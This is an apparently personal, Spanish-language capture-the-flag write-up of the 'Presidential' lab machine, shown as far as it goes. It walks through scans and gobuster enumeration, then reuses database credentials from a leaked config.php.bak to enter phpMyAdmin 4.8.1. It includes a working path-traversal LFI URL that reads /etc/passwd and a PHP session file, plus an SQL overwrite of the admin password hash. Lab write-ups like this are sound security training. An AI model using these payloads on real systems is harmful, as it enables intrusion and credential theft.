# Presidential

Si la máquina da problemas para iniciar, se puede editar la interfaz de red
localizando el archivo */etc/sysconfig/network-scripts*. Renombrar el fichero *ifcfg-enp0s3* a *ifconfi-eth0*, 
luego editarlo y allá donde ponga *enp0s3* cambiar por *eth0*.

Poner la máquina en VMWare con ethernet bridged. Si nos peta al editar los parámetros, editar el fichero vmx
y eliminar todas las entradas ethernet que encontremos. Añadir ethernet.addressType = "generated" ethernet0.present=TRUE.

-------------------------------------------------------------------------------

Comenzamos realizando un escaneo de red para ver la máquina a atacar:

```bash
> sudo arp-scan -I eth0 --localnet
```

```bash
Interface: eth0, type: EN10MB, MAC: 08:00:27:22:46:4f, IPv4: 192.168.1.80
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     48:8d:36:4f:94:37       Arcadyan Corporation
192.168.1.15    e0:d5:5e:56:4d:af       GIGA-BYTE TECHNOLOGY CO.,LTD.
192.168.1.32    78:c8:81:2a:af:2d       Sony Interactive Entertainment Inc.
192.168.1.26    d4:a6:51:1b:71:3b       Tuya Smart Inc.
192.168.1.98    9c:d2:1e:5d:d5:57       Hon Hai Precision Ind. Co.,Ltd.
192.168.1.34    e8:9f:6d:a5:54:54       Espressif Inc.
192.168.1.12    68:db:f5:00:01:0e       Amazon Technologies Inc.
192.168.1.132   04:42:1a:d0:a4:f3       ASUSTek COMPUTER INC.
192.168.1.142   00:0c:29:cb:10:82       VMware, Inc.
192.168.1.45    de:24:d0:58:b9:9f       (Unknown: locally administered)
```

Vemos que hay una máquina VMWare en la red. Esta es la única máquina de VMWare que existe por lo tanto tiene que ser la máquina víctima:

-------------------------------------------------------------------------------

Ahora vamos a hacer un ping para ver que está activa y no hemos recibido datos cacheados:


```bash
> ping -c 1 192.168.1.142                     
PING 192.168.1.142 (192.168.1.142) 56(84) bytes of data.
64 bytes from 192.168.1.142: icmp_seq=1 ttl=64 time=3.36 ms

--- 192.168.1.142 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.363/3.363/3.363/0.000 ms
```

-------------------------------------------------------------------------------

Hagamos un scaneo de puertos a ver qué se encuentra abierto:

```bash
> sudo nmap -sS -n -p1-10000 -vvv -minrate 5000 192.168.1.142
```

```bash
warning: The -m option is deprecated. Please use -oG
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 06:53 EST
Initiating Ping Scan at 06:53
Scanning 5000 (0.0.19.136) [4 ports]
Completed Ping Scan at 06:53, 3.06s elapsed (1 total hosts)
Nmap scan report for 5000 (0.0.19.136) [host down, received no-response]
Initiating ARP Ping Scan at 06:53
Scanning 192.168.1.142 [1 port]
Completed ARP Ping Scan at 06:53, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 06:53
Scanning 192.168.1.142 [10000 ports]
Discovered open port 80/tcp on 192.168.1.142
Discovered open port 2082/tcp on 192.168.1.142
Completed SYN Stealth Scan at 06:53, 3.65s elapsed (10000 total ports)
Nmap scan report for 192.168.1.142
Host is up, received arp-response (0.014s latency).
Scanned at 2023-01-30 06:53:41 EST for 4s
Not shown: 9998 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
80/tcp   open  http     syn-ack ttl 64
2082/tcp open  infowave syn-ack ttl 64
MAC Address: 00:0C:29:CB:10:82 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 2 IP addresses (1 host up) scanned in 7.04 seconds
           Raw packets sent: 10025 (441.036KB) | Rcvd: 10001 (400.036KB)
```

Vemos que encontramos abirtos 2 puertos, el 80, que corre *http*, y el 2082 que corre otro servicio que denomina *infowave.*

Ahora miraremos el resto de puertos por si hay algun más abierto, pero no hay ninguno más.

-------------------------------------------------------------------------------

Miremos qué servicios y qué versiones están corriedo en esos puertos:

```bash
> sudo nmap -sCV -n -p80,2082 192.168.1.142                 
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 07:46 EST
Nmap scan report for 192.168.1.142
Host is up (0.0037s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
|_http-title: Ontario Election Services &raquo; Vote Now!
| http-methods: 
|_  Potentially risky methods: TRACE
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0640f4e58cad1ae686dea575d0a2ac80 (RSA)
|   256 e9e63a838e94f298dd3e70fbb9a3e399 (ECDSA)
|_  256 66a8a19fdbd5ec4c0a9c4d53156c436c (ED25519)
MAC Address: 00:0C:29:CB:10:82 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
```

-------------------------------------------------------------------------------

Vamos a mirar qué tecnologías web están corriendo en el servicio web:

```
http://192.168.1.142 [200 OK] Apache[2.4.6], Bootstrap, Country[RESERVED][ZZ],
Email[contact@example.com,contact@votenow.loca], HTML5, 
HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.5.38], IP[192.168.1.142], 
JQuery, PHP[5.5.38], Script, Title[Ontario Election Services &raquo; Vote Now!]
```
-------------------------------------------------------------------------------

En este punto, vamos a enumerar ficheros que busquemos en el servicio web:

```bash
> gobuster dir --url http://192.168.1.142 --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,zip,gz,bak
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.142
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              js,zip,gz,bak,php,html,txt
[+] Timeout:                 10s
===============================================================
2023/01/30 07:51:04 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/about.html           (Status: 200) [Size: 20194]
/index.html           (Status: 200) [Size: 11713]
/assets               (Status: 301) [Size: 236] [--> http://192.168.1.142/assets/]
/config.php           (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 207]
```

Vemos que hay varios ficheros interesantes por mirar como index.html, about.html el directorio assets y config.php que lo más probable es que no podamos ver el código.

-------------------------------------------------------------------------------

Miremos a ver qué encontramos en el directorio assets:

```bash
> gobuster dir --url http://192.168.1.142/assets --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,zip,gz,bak
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.142/assets
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              zip,gz,bak,php,html,txt,js
[+] Timeout:                 10s
===============================================================
2023/01/30 08:26:21 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 214]
/img                  (Status: 301) [Size: 240] [--> http://192.168.1.142/assets/img/]
/css                  (Status: 301) [Size: 240] [--> http://192.168.1.142/assets/css/]
/js                   (Status: 301) [Size: 239] [--> http://192.168.1.142/assets/js/]
/vendor               (Status: 301) [Size: 243] [--> http://192.168.1.142/assets/vendor/]
/.html                (Status: 403) [Size: 214]
Progress: 1763609 / 1764488 (99.95%)
===============================================================
2023/01/30 08:41:34 Finished
===============================================================
```

Dentro de assets hemos encontrado varios directorios que podemos explorar.

-------------------------------------------------------------------------------

En este punto podríamos buscar ficheros backup que hayan quedado perdidos en la web.

```bash
> gobuster dir -d --url http://192.168.1.142 --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,zip,gz        
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.142
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,html,txt,js,zip,gz
[+] Timeout:                 10s
===============================================================
2023/01/30 08:48:24 Starting gobuster in directory enumeration mode
===============================================================
...
/.html.html.swp       (Status: 403) [Size: 216]
/assets               (Status: 301) [Size: 236] [--> http://192.168.1.142/assets/]
/config.php.bak       (Status: 200) [Size: 107]
/config.php           (Status: 200) [Size: 0]
/.http.swp            (Status: 403) [Size: 211]
...
Progress: 10807012 / 10807489 (100.00%)
===============================================================
2023/01/30 10:28:33 Finished
===============================================================
```

Y encontramos el fichero config.php.bak
                                                                  
-------------------------------------------------------------------------------

Veamos qué pinta tiene la página web de dicha máquina.

![homepage.png](homepage.png)


En la página podemos encontrar una serie de candidatos a la presidencia cuyos nombres podrían ser utilizados como nombres de usuario.

![candidates.png](candidates.png)

Miremos también qué pinta tiene la página about:

![about.png](about.png)

En esta página también hay una sección que incluye el staff que participa en la creación de la web. Estos, también podrían ser candidatos a nombres de usuario de la máquina.

Miremos el fichero config.php.bak a ver:

```php
<?php
$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";
?>
```

-------------------------------------------------------------------------------

Con esta información no hacemos nada, y después de inspeccionar la web de arriba a abajo varias veces, y de mirar como se realizan las requests desde burpsuite, continuamos con la enumeración:

-------------------------------------------------------------------------------

Enumeración de subdominios usando la lista de palabras subdomains-top1million-110000.txt
(Append domain activado pero por casualidad porque en este punto no sabía para qué servía)

```bash
>  gobuster vhost --append-domain -u http://votenow.local/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/31 08:27:42 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.votenow.local Status: 400 [Size: 347]
Found: _domainkey.votenow.local Status: 400 [Size: 347]
Found: mailing._domainkey.sunnynews.votenow.local Status: 400 [Size: 347]
Found: mailing._domainkey.info.votenow.local Status: 400 [Size: 347]
Found: hallam_dev.votenow.local Status: 400 [Size: 347]
Found: hallam_ad.votenow.local Status: 400 [Size: 347]
Found: wm_j_b__ruffin.votenow.local Status: 400 [Size: 347]
Found: 2609_n_www.votenow.local Status: 400 [Size: 347]
Found: 0907_n_hn.m.votenow.local Status: 400 [Size: 347]
Found: 0507_n_hn.votenow.local Status: 400 [Size: 347]
Found: faitspare_mbp.cit.votenow.local Status: 400 [Size: 347]
Found: sb_0601388345bc6cd8.votenow.local Status: 400 [Size: 347]
Found: sb_0601388345bc450b.votenow.local Status: 400 [Size: 347]
Found: api_portal_dev.votenow.local Status: 400 [Size: 347]
Found: api_web_dev.votenow.local Status: 400 [Size: 347]
Found: api_webi_dev.votenow.local Status: 400 [Size: 347]
Found: sklep_test.votenow.local Status: 400 [Size: 347]
Progress: 114379 / 114442 (99.94%)
===============================================================
2023/01/31 08:32:44 Finished
===============================================================
```

-------------------------------------------------------------------------------

Enumeración de ficheros php,html,htm,sql,ajax,js utilizando la lista de palabras directory-list-2.3-big.txt

```bash
> gobuster dir --url http://192.168.1.142 --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,htm,sql,ajax,js 
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.142
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              sql,ajax,js,php,html,htm
[+] Timeout:                 10s
===============================================================
2023/01/31 15:33:33 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/.htm                 (Status: 403) [Size: 206]
/index.html           (Status: 200) [Size: 11713]
/about.html           (Status: 200) [Size: 20194]
/assets               (Status: 301) [Size: 236] [--> http://192.168.1.142/assets/]
/config.php           (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 207]
/.htm                 (Status: 403) [Size: 206]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.ajax (Status: 403) [Size: 458]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 458]
Progress: 8916282 / 8916838 (99.99%)
===============================================================
2023/01/31 17:26:32 Finished
===============================================================
```

-------------------------------------------------------------------------------

Enumeración de dominios utilizando la lista de palabras directory-list-2.3-medium.txt
(En este caso no se ha utilizado append-domain porque no sabía que se tenía que utilizar)

```bash
> gobuster vhost -u http://votenow.local -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -v "Status: 400"
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
2023/01/31 17:30:57 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 220528 / 220561 (99.99%)
===============================================================
2023/01/31 17:40:31 Finished
===============================================================
```

-------------------------------------------------------------------------------

Enumeración de archivos html usando wfuzz y la lista de palabras directory-list-2.3-big.txt.
No tenía que haber sido necesario porque esta búsqueda ya estaba incluida en una enumeración previa en la que se usó gobuster)

```bash
> wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt http://192.168.1.142/FUZZ.html         
```

```bash
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /usr/lib/python3/dist-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.12) or chardet (5.1.0)/charset_normalizer (2.0.6) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.142/FUZZ.html
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                  
=====================================================================

000000003:   200        282 L    854 W      11713 Ch    "# Copyright 2007 James F
                                                        isher"                   
000000010:   200        282 L    854 W      11713 Ch    "#"                      
000000007:   200        282 L    854 W      11713 Ch    "# license, visit http://
                                                        creativecommons.org/licen
                                                        ses/by-sa/3.0/"          
000000009:   200        282 L    854 W      11713 Ch    "# Suite 300, San Francis
                                                        co, California, 94105, US
                                                        A."                      
000000008:   200        282 L    854 W      11713 Ch    "# or send a letter to Cr
                                                        eative Commons, 171 Secon
                                                        d Street,"               
000000005:   200        282 L    854 W      11713 Ch    "# This work is licensed 
                                                        under the Creative Common
                                                        s"                       
000000004:   200        282 L    854 W      11713 Ch    "#"                      
000000001:   200        282 L    854 W      11713 Ch    "# directory-list-2.3-big
                                                        .txt"                    
000000006:   200        282 L    854 W      11713 Ch    "# Attribution-Share Alik
                                                        e 3.0 License. To view a 
                                                        copy of this"            
000000002:   200        282 L    854 W      11713 Ch    "#"                      
000000011:   200        282 L    854 W      11713 Ch    "# Priority-ordered case-
                                                        sensitive list, where ent
                                                        ries were found"         
000000013:   200        282 L    854 W      11713 Ch    "#"                      
000000015:   200        282 L    854 W      11713 Ch    "index"                  
000000012:   200        282 L    854 W      11713 Ch    "# on at least 1 host"   
000000026:   200        474 L    1325 W     20194 Ch    "about"                  

Total time: 7256.980
Processed Requests: 1273833
Filtered Requests: 1273818
Requests/sec.: 175.5320
```

-------------------------------------------------------------------------------

Tras mil millones de enumeraciones, volvemos a volver a realizar la enumeración por subdominios, pero esta vez utilizando la lista de palabras directory-list-2.3-medium.txt
y añadiendo append-domain.

```bash
> gobuster vhost --append-domain -u http://votenow.local/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -v "400"
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/02/01 05:18:04 Starting gobuster in VHOST enumeration mode
===============================================================
Found: datasafe.votenow.local Status: 200 [Size: 9499]
Progress: 220343 / 220561 (99.90%)
===============================================================
2023/02/01 05:26:01 Finished
===============================================================
```

Nota: entre la versión 3.1 y 3.3 gobuster ha añadido la opción "append-domain" que antes realizaba automáticamente por defecto. Ahora por defecto, esta opción está desactivada, así que la linea de comandos que en la versión 3.1 encontraba el subdominio en cuestión, en la 3.3 no.
Hemos tenido muy mala pata al realizar las enumeraciones, y de no haber sido por la opción append-domain nueva, hubieramos encontrado antes el dominio perdido.

-------------------------------------------------------------------------------

Habiendo encontrado el dominio **datasafe.votenow.local** podemos proceder a inspeccionarlo.

En el navegador no se ve nada. Procedamos entonces a realizar una enumeración de ficheros estándard.

Un paso que nos hemos saltado, es el añadir el nuevo dominio encontrado al fichero /etc/hosts. Ese es el motivo por el que al inspeccionar el dominio en el navegador no veíamos nada.

-------------------------------------------------------------------------------

Una vez realizado esto, volvemos a entrar en el navegador, y esta vez, lo que vemos es un panel de login de phpMyAdmin.

![phpmyadmin.png](phpmyadmin.png)

Intentamos entrar con las credenciales típicas admin/admin y esto es lo que vemos en pantalla:

![phpmyadmin_nologin.png](phpmyadmin_nologin.png)

-------------------------------------------------------------------------------

Si recordamos, previamente, durante la enumeración de fiheros de backup, encontramos un fichero config.php.bak que contenía unas credenciales.

```
$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
```

Probando dichas credenciales, entramos al panel phpMyAdmin.

-------------------------------------------------------------------------------

Una vez dentro, podemos ver la base de datos votebox, y vemos que contiene una tabla users con una 2 columnas, username/password. Dicha tabla solo tiene una entrada:

```
username | password
admin | $2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
```

Mirando con hashid, no nos da información sobre el hash encontrado (lo cual es raro porque es un hash muy típico). Sin embargo sabemos por otras máquinas realizadas que a entrada es un hash realizado con BCrypt2

-------------------------------------------------------------------------------

Una cosa que podemos probar es a cambiar la constraseña del admin en SQL

Generamos una constraseña del mismo tipo 

```bash
> mkpasswd -m bcrypt 123456
```

```bash
$2b$05$I5GSq/A4OaPHH5lmqVowye68Sj8hpuSZJCM9i6kCDplSqC1BFvuFe
```

E insertamos la nueva contraseña en la tabla:

```sql
UPDATE `users` SET `password`="$2b$05$I5GSq/A4OaPHH5lmqVowye68Sj8hpuSZJCM9i6kCDplSqC1BFvuFe" WHERE `username`="admin"
```

Pero de momento esto no sirve para nada. Intentamos entrar con las credenciales admin/123456 en el panel de login, pero no sirve. No tiene nada que ver.

-------------------------------------------------------------------------------

Enumerando de nuevo, vemos varios ficheros que se encuentran disponibles. Sin embargo, la mayoría redirigen al panel de login.

```bash
> gobuster dir --url datasafe.votenow.local --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,htm,sql,ajax,js,bak,php.bak
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://datasafe.votenow.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,htm,sql,ajax,js,bak,php.bak,php
[+] Timeout:                 10s
===============================================================
2023/02/01 15:54:29 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/.htm                 (Status: 403) [Size: 206]
/index.php            (Status: 200) [Size: 9499]
/templates            (Status: 301) [Size: 248] [--> http://datasafe.votenow.local/templates/]
/themes               (Status: 301) [Size: 245] [--> http://datasafe.votenow.local/themes/]
/themes.php           (Status: 200) [Size: 9500]
/doc                  (Status: 301) [Size: 242] [--> http://datasafe.votenow.local/doc/]
/scripts              (Status: 301) [Size: 246] [--> http://datasafe.votenow.local/scripts/]
/ajax.php             (Status: 200) [Size: 9502]
/test                 (Status: 301) [Size: 243] [--> http://datasafe.votenow.local/test/]
/license.php          (Status: 200) [Size: 9504]
/navigation.php       (Status: 200) [Size: 9504]
/README               (Status: 200) [Size: 1520]
/examples             (Status: 301) [Size: 247] [--> http://datasafe.votenow.local/examples/]
/js                   (Status: 301) [Size: 241] [--> http://datasafe.votenow.local/js/]
/libraries            (Status: 301) [Size: 248] [--> http://datasafe.votenow.local/libraries/]
/logout.php           (Status: 200) [Size: 9500]
/url.php              (Status: 302) [Size: 0] [--> /]
/changelog.php        (Status: 200) [Size: 9506]
/export.php           (Status: 200) [Size: 9500]
/ChangeLog            (Status: 200) [Size: 20501]
/vendor               (Status: 301) [Size: 245] [--> http://datasafe.votenow.local/vendor/]
/setup                (Status: 301) [Size: 244] [--> http://datasafe.votenow.local/setup/]
/sql                  (Status: 301) [Size: 242] [--> http://datasafe.votenow.local/sql/]
/sql.php              (Status: 200) [Size: 9507]
/tmp                  (Status: 301) [Size: 242] [--> http://datasafe.votenow.local/tmp/]
/LICENSE              (Status: 200) [Size: 18092]
/po                   (Status: 301) [Size: 241] [--> http://datasafe.votenow.local/po/]
/import.php           (Status: 200) [Size: 9504]
/lint.php             (Status: 200) [Size: 9498]
/.htm                 (Status: 403) [Size: 206]
/.html                (Status: 403) [Size: 207]
/server_status.php    (Status: 200) [Size: 9517]
/phpinfo.php          (Status: 200) [Size: 9505]
/db_search.php        (Status: 200) [Size: 9503]
Progress: 1984821 / 1985049 (99.99%)
===============================================================
2023/02/01 16:12:55 Finished
===============================================================
```
-------------------------------------------------------------------------------

Mirando http://datasafe.votenow.local/ChangeLog 
Vemos que la versión de

```bash
phpMyAdmin - ChangeLog
======================

4.8.1 (2018-05-24)
```

De hecho en el fichero README que también es accesible, es la versión que pone :D

Por lo tanto, miramos en searchsploit si existe algún exploit para esta versión de phpMyAdmin.

```bash
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)     | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)     | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                  | php/webapps/50457.py
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Hay varios exploits, miramos por ejemplo el primero, que nos explica una manera de conseguir un LFI.

Logramos hacer un LFI con la siguiente linea en la url:

```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
adm:x:3:4:adm:/var/adm:/sbin/nologin 
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 
operator:x:11:0:operator:/root:/sbin/nologin 
games:x:12:100:games:/usr/games:/sbin/nologin 
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd
Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 
postfix:x:89:89::/var/spool/postfix:/sbin/nologin 
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/bash
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
```

-------------------------------------------------------------------------------

Podemos inspeccionar varios ficheros, como httpd.conf y algunos mas pero en uno de los exploits se mencionaba que podíamos intentar ver si podíamos acceder a los archivos de la sesion php.
el archivo de sesion de la php está localizado en el directorio indicado en la variable session.save_path, y por defecto este, está situado en /var/lib/php/sessions

OJO.: Esta máquina lo tiene en /var/lib/php/session <- en singular, lo que te obliga a mirar writeup porque te vuelves loco averiguando por que no encuentras estos ficheros.

El nombre del fichero suele comenzar con el prefijo "sess_" y a continuación la cookie de session. Utilizando burpsuite, podemos ver perfectamente el nombre y valor de dicha cookie:

![phpsessionid.png](phpsessionid.png)

Así pues la ruta exacta donde encontrar el fichero de sesion sería 

/var/lib/php/session/sess_htmu66othqmaf4dvv37hs3taajavmjb5

y esta es la url que nos lo proporcionará:

http://datasafe.votenow.local/index.php?target=db_sql.php%253f../../../../../../../../var/lib/php/session/sess_htmu66othqmaf4dvv37hs3taajavmjb5

![session_file.png](session_file.png)

```
PMA_token |s:16:"y/)Hw1x2gITZ--tq";browser_access_time|a:1:{s:7:"default";i:1675460312;}relation|a:1:{i:1;a:22:{s:11:"PMA_VERSION";s:5:"4.8.1";s:7:"relwork";b:0;s:11:"displaywork";b:0;s:12:"bookmarkwork";b:0;s:7:"pdfwork";b:0;s:8:"commwork";b:0;s:8:"mimework";b:0;s:11:"historywork";b:0;s:10:"recentwork";b:0;s:12:"favoritework";b:0;s:11:"uiprefswork";b:0;s:12:"trackingwork";b:0;s:14:"userconfigwork";b:0;s:9:"menuswork";b:0;s:7:"navwork";b:0;s:17:"savedsearcheswork";b:0;s:18:"centralcolumnswork";b:0;s:20:"designersettingswork";b:0;s:19:"exporttemplateswork";b:0;s:8:"allworks";b:0;s:4:"user";N;s:2:"db";N;}}cache|a:2:{s:16:"server_1_votebox";a:16:{s:14:"mysql_cur_user";s:9:"votebox@%";s:17:"is_create_db_priv";b:1;s:14:"is_reload_priv";b:0;s:12:"db_to_create";s:8:"votebox_";s:30:"dbs_where_create_table_allowed";a:2:{i:0;s:7:"votebox";i:1;s:10:"votebox\_%";}s:11:"dbs_to_test";a:6:{i:0;s:18:"information_schema";i:1;s:18:"performance_schema";i:2;s:5:"mysql";i:3;s:3:"sys";i:4;s:7:"votebox";i:5;s:10:"votebox\_%";}s:9:"proc_priv";b:0;s:10:"table_priv";b:0;s:8:"col_priv";b:0;s:7:"db_priv";b:0;s:12:"is_superuser";b:0;s:12:"is_grantuser";b:0;s:13:"is_createuser";b:0;s:11:"binary_logs";a:0:{}s:18:"menu-levels-server";a:13:{s:9:"databases";s:9:"Databases";s:3:"sql";s:3:"SQL";s:6:"status";s:6:"Status";s:6:"rights";s:5:"Users";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:8:"settings";s:8:"Settings";s:6:"binlog";s:10:"Binary log";s:11:"replication";s:11:"Replication";s:4:"vars";s:9:"Variables";s:7:"charset";s:8:"Charsets";s:7:"plugins";s:7:"Plugins";s:6:"engine";s:7:"Engines";}s:14:"menu-levels-db";a:14:{s:9:"structure";s:9:"Structure";s:3:"sql";s:3:"SQL";s:6:"search";s:6:"Search";s:17:"multi_table_query";s:5:"Query";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:9:"operation";s:10:"Operations";s:10:"privileges";s:10:"Privileges";s:8:"routines";s:8:"Routines";s:6:"events";s:6:"Events";s:8:"triggers";s:8:"Triggers";s:8:"tracking";s:8:"Tracking";s:8:"designer";s:8:"Designer";s:15:"central_columns";s:15:"Central columns";}}s:8:"server_1";a:3:{s:15:"userprefs_mtime";i:1675459715;s:14:"userprefs_type";s:7:"session";s:12:"config_mtime";i:1527216327;}}encryption_key|s:32:"��U��N�9e�������ǁ @ 